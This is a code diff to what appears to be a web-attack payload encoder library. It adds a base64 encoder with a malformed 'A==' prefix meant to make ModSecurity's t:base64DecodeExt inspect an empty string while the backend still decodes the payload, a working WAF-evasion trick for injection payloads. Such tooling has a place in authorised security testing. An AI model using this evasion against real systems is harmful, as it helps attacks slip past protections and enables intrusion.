@@ -34,6 +34,17 @@ def b64(s: str) -> str:
     return base64.b64encode(s.encode()).decode()
 
 
+def b64_malformed_prefix(s: str) -> str:
+    """base64(payload) prefixed with a malformed single-char padding group 'A=='.
+
+    ModSecurity t:base64DecodeExt (GHSA-4j47-8qcr-jf59) discards the ENTIRE
+    decoded value when it meets a malformed single-char padding group, so the WAF
+    inspects an empty string while tolerant backend decoders still recover the
+    payload after the bad group. For params the app base64-decodes.
+    """
+    return "A==" + base64.b64encode(s.encode()).decode()
+
+
 def js_unicode(s: str) -> str:
     return "".join(f"\\u{ord(c):04x}" for c in s)
 
@@ -82,6 +93,8 @@ def _register() -> None:
     R.add("double_url", double_url, "encoder", "double percent-encode")
     R.add("url_plus_space", url_plus_space, "encoder", "spaces -> '+'")
     R.add("base64", b64, "encoder", "base64 (for params the app decodes)")
+    R.add("base64_malformed_prefix", b64_malformed_prefix, "encoder",
+          "base64 with malformed 'A==' prefix (ModSecurity t:base64DecodeExt GHSA-4j47-8qcr-jf59)")
     R.add("js_unicode", js_unicode, "encoder", r"\uXXXX escapes", classes={"XSS Injection", "*"})
     R.add("js_hex", js_hex, "encoder", r"\xNN escapes", classes={"XSS Injection", "*"})
     R.add("html_entity_dec", html_entity_dec, "encoder", "&#NN; entities", classes={"XSS Injection", "*"})
